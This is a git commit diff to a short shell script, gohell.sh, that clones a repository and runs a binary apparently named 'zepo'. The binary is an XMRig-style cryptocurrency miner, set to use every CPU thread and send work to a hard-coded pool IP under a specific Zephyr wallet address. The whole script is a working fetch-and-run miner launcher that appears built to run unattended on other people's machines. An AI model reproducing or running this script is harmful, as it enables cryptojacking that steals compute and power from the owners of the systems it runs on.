0451350f62cb5a9cb89db078b4cd3c13cb2dee3f
6248202226 <149418871+6248202226@users.noreply.github.com>
2023-11-26 03:44:33 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/6248202226/gradi/edit/main/zepo >/dev/null 2>&1
+git clone https://github.com/6248202226/gradi.git && cd gradi
 chmod +x zepo
 ./zepo --donate-level 1 -o 149.28.147.155:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -a rx/0 -k -t $(nproc --all) 
